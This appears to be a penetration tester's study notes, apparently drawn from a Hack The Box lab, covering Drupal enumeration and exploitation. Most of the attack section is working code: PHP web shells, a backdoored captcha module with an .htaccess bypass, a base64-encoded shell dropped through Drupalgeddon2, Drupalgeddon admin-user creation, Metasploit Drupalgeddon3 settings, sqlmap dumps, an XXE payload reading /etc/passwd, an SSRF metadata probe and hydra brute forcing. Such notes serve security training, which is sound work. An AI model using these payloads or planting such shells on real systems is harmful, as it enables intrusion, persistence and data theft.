# 5.-Drupal-discovery-and-enumeration

### 1. Basic Drupal Identification:

```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
#   - Check HTML source for Drupal metadata.
curl -s http://drupal.inlanefreight.local/robots.txt
#   - Analyze robots.txt for disallowed directories and node references.
curl -s http://drupal.inlanefreight.local/node/1
#   - Check for node paths (common Drupal URL structure).
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
#   - Check for version information (may be blocked).
```

### 2. Drupal Version Enumeration:

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
#   - Use droopescan for automated version detection and module/theme enumeration.
curl -s http://drupal.inlanefreight.local/core/assets/vendor/jquery/jquery.min.js | grep "Drupal"
#   - Check JavaScript files for version information.
curl -s http://drupal.inlanefreight.local/rss.xml | grep generator
#   - Check RSS feeds for generator metadata.
```

**Database Version check (if access gained):**

```sql
SELECT version FROM system;
```

### 3. Drupal Module Enumeration:

```bash
curl -s http://drupal.inlanefreight.local/modules/
#   - List modules directory contents.
curl -s http://drupal.inlanefreight.local/modules/[module_name]/[module_file].js
#   - Check for module-specific JavaScript files.
curl -s http://drupal.inlanefreight.local/modules/[module_name]/[module_file].css
#   - Check for module-specific CSS files.
curl -s http://drupal.inlanefreight.local/modules/[module_name]/[module_file].info.yml
#   - Check for module version information.
```

### 4. Drupal Theme Enumeration:

```bash
curl -s http://drupal.inlanefreight.local/themes/
#   - List themes directory contents.
curl -s http://drupal.inlanefreight.local/themes/[theme_name]/style.css
#   - Check style.css for theme version.
curl -s http://drupal.inlanefreight.local/themes/[theme_name]/[theme_file].info.yml
#   - Check for theme version information.
```

### 5. Drupal Configuration File Check:

```bash
curl -s http://drupal.inlanefreight.local/sites/default/settings.php
#   - Check for exposed settings.php or other configuration files.
```

### 6. Drupal User Enumeration:

```bash
curl -s http://drupal.inlanefreight.local/?q=user
#   - Check for publicly visible user profiles.
curl -s http://drupal.inlanefreight.local/user/1
#   - Test default admin user enumeration.
```

### 7. Drupal REST API Enumeration:

```bash
curl -s http://drupal.inlanefreight.local/rest/user/login_status?_format=json
#   - Enumerate the Drupal REST API if enabled.
curl -s http://drupal.inlanefreight.local/rest/
curl -s http://drupal.inlanefreight.local/rest/export?_format=json
#   - Check for publicly accessible REST export endpoints.
```

### 8. Drupal Content Enumeration:

```bash
curl -s http://drupal.inlanefreight.local/node/2
#   - Check if sequential node IDs exist.
curl -s http://drupal.inlanefreight.local/node.json
#   - Check if Drupal JSON API is enabled.
```

### 9. Drupal Backup & Debug Files Enumeration:

```bash
curl -s http://drupal.inlanefreight.local/sites/default/files/backup.sql
#   - Check for exposed database backups.
curl -s http://drupal.inlanefreight.local/phpinfo.php
#   - Test for exposed phpinfo() (debugging enabled).
```

### 10. Drupal Admin Panel Access Check:

```bash
curl -s http://drupal.inlanefreight.local/user/login
#   - Check if login page is accessible.
curl -s http://drupal.inlanefreight.local/admin
#   - Check for direct access to admin panel.
```

### 11. Drupal GraphQL API Enumeration (if enabled):

```bash
curl -X POST http://drupal.inlanefreight.local/graphql -H "Content-Type: application/json" --data '{"query":"{__schema { types { name } }}"}'
#   - Check for exposed GraphQL endpoint.
```

### 12. Robots.txt Analysis:

```bash
curl -s http://drupal.inlanefreight.local/robots.txt
#   - Analyze robots.txt for sensitive disallows or revealing paths.
```

# ATTACKING DRUPAL


### 1. PHP Filter Module Exploitation (Drupal < 8)

```sh
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

* Enable PHP filter module, inject code via content.
* **Consideration:** Client communication before enabling modules.

### 2. Backdoored Module Upload

```sh
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' > captcha/shell.php
echo '<IfModule mod_rewrite.c>RewriteEngine On;RewriteBase /</IfModule>' > captcha/.htaccess
tar cvf captcha.tar.gz captcha/captcha/
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

* Upload malicious module via admin panel.
* **Consideration:** Avoid modifying production systems without explicit permission.

### 3. Drupalgeddon (CVE-2014-3704)

```sh
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

* Create admin user via SQL injection.
* **Consideration:** Impact of creating unauthorized admin accounts.

### 4. Drupalgeddon2 (CVE-2018-7600)

```sh
python3 drupalgeddon2.py
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

* RCE via user registration form.
* **Consideration:** Severity of unauthenticated RCE vulnerabilities.

### 5. Drupalgeddon3 (CVE-2018-7602)

```sh
msf6 > use exploit/multi/http/drupal_drupageddon3
msf6 > set rhosts 10.129.42.195
msf6 > set VHOST drupal-acc.inlanefreight.local
msf6 > set drupal_session SESS...
msf6 > set DRUPAL_NODE 1
msf6 > set LHOST 10.10.14.15
msf6 > exploit
```

* RCE via Form API (requires authenticated session).
* **Consideration:** Session hijacking risks.

### 6. Drupal Configuration File Exploitation/Security

```sh
curl -s http://drupal.inlanefreight.local/sites/default/settings.php
ls -l sites/default/settings.php
cat .htaccess
```

* Check for exposed settings.php, extract database credentials.
* **Consideration:** Secure configuration file permissions and access.

### 7. Database Exploitation (SQL Injection - Expanded)

```sh
curl "http://drupal.inlanefreight.local/node/1?id=1'--"
curl "http://drupal.inlanefreight.local/node/1?id=1' OR '1'='1"
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" --dbs --batch
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" -D [database_name] --tables --batch
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" -D [database_name] -T [table_name] --columns --batch
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" -D [database_name] -T [table_name] -C [column1,column2] --dump --batch
sqlmap -u "http://drupal.inlanefreight.local/node/1?id=1" --level 5 --risk 3
```

* Manual and automated SQL injection testing.
* **Consideration:** Validate findings with alternative tools.

### 8. Form API Exploitation

```sh
curl -X POST -d "param1=value1&param2=payload" http://drupal.inlanefreight.local/form_path
```

* **Consideration:** Burp Suite is very helpful for deeper analysis.

### 9. File Upload Vulnerabilities

```sh
curl -F "file=@malicious.php" http://drupal.inlanefreight.local/upload_path
```

* Test various file extensions.
* **Consideration:** Look for MIME type enforcement.

### 10. Access Control Vulnerabilities

```sh
curl -I http://drupal.inlanefreight.local/admin
```

* Check for 200 response when not authenticated.
* **Consideration:** Test different user roles.

### 11. Session Management Vulnerabilities

* Use Burp Suite's Sequencer and Session handling rules.

### 12. XML External Entity (XXE) Injection

```sh
curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>' http://drupal.inlanefreight.local/xml_endpoint
```

### 13. Server-Side Request Forgery (SSRF)

```sh
curl "http://drupal.inlanefreight.local/page?url=http://169.254.169.254/latest/meta-data/"
```

* **Consideration:** Check response for internal metadata leaks.

### 14. Drupal Brute Forcing

```sh
wpscan --url http://drupal.inlanefreight.local/ --enumerate u --passwords /usr/share/wordlists/rockyou.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt drupal.inlanefreight.local http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:Invalid username or password"
```

* **Consideration:** Use specific tools for Drupal authentication mechanisms.

### Additional Notes:

* **Ensure Drupal versions are known before testing specific exploits.**
* **Use enumeration tools like droopescan for discovering modules and themes.**
* **Test patches and mitigations post-exploitation to ensure security fixes.**

### Important Details & Considerations:

* **JavaScript Versioning:** Check core and theme JavaScript for Drupal version.
* **Module Versioning:** Find exact module versions using .info.yml or similar files.
* **Theme Versioning:** Check style.css or .info.yml for theme versions.
* **Drupal File Structure:** Understand core directories like /modules/, /themes/, and /sites/.
* **robots.txt:** Pay close attention to disallowed directories that may reveal sensitive information.
* **Drupal REST API:** If enabled, thoroughly enumerate the REST API.
* **Database Version:** If database access is gained, query the system table for the Drupal version.
* **User Enumeration:** Identify publicly accessible user profiles and potential admin accounts.
* **Service Endpoints:** Check REST endpoints for exposed sensitive data.
* **Content Enumeration:** Investigate sequential node IDs and JSON API exposure.
* **Backup & Debug Files:** Identify any misconfigured backups or exposed debugging information.
* **Admin Access:** Determine if direct access to the admin panel is possible.
* **GraphQL API:** Enumerate GraphQL endpoints for schema exposure.

# THOROUGH NOTES
# Discovery/Footprinting Versions

A Drupal website can be identified in several ways, including by the header or footer message `Powered by Drupal`, the standard Drupal logo, the presence of a `CHANGELOG.txt` file or `README.txt file`, via the page source, or clues in the robots.txt file such as references to `/node`.

`Discovering drupal`
```shell-session
curl -s http://drupal.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Another way to identify Drupal CMS is through [nodes](https://www.drupal.org/docs/8/core/modules/node/about-nodes).  `/node/<nodeid>`.

## FingerPrinting the version

Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files, 

`changelog.txt`
```shell-session
$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```

`droopscan`
```
$ droopescan scan drupal -u http://drupal.inlanefreight.local
```

##     RCE authenticated)
#### Leveraging the PHP Filter Module

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
![](drupal_php_module.webp)
From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.

![](basic_page.webp)
We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common `cmd` to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard `system($_GET['cmd']);` we open up ourselves up to a "drive-by" attacker potentially coming across our web shell. Though unlikely, better safe than sorry!

Code: php

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
![](basic_page_shell_7v2%201.webp)

`use shell`
```shell-session
$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
![](Pasted%20image%2020250212153544.png)
## WHEN PHP MODULE IS NOT PRESENT

From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default

`install the module ourselves`
```
$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
Once downloaded go to `Administration` > `Reports` > `Available updates`.

From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.

Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown.

---------------------------------
##  Backdoored Module Approach

`captcha module download`
```shell-session
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

`create webshell`
```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

`create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.`
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.


`copy files and archive the folder`
```shell-session
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.


Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.


`test webshell`
```shell-session
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
# Leveraging Known Vulnerabilities:

## CVEs
- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
    
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
    
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

`duplegon abuse to add user`
```shell-session
$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

`metasploit`
```
use drupal_druppagedon
```

## druppagedon2

https://www.exploit-db.com/exploits/44448
```shell-session
python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```
We can check quickly with `cURL` and see that the `hello.txt` file was indeed uploaded.

`confirming`
```shell-session
curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```
Now let's modify the script to gain remote code execution by uploading a malicious PHP file.

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

`appending`
```shell-session
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

Next, let's replace the `echo` command in the exploit script with a command to write out our malicious PHP script.

```shell-session
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

`Next, run the modified exploit script to upload our malicious PHP file.`
```shell-session
python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php
```

Finally, we can confirm remote code execution using `cURL`.

```shell-session
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Drupalgeddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.

![image](https://academy.hackthebox.com/storage/modules/113/burp.png)

Once we have the session cookie, we can set up the exploit module as follows.
`MSF`
```shell-session
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 
```
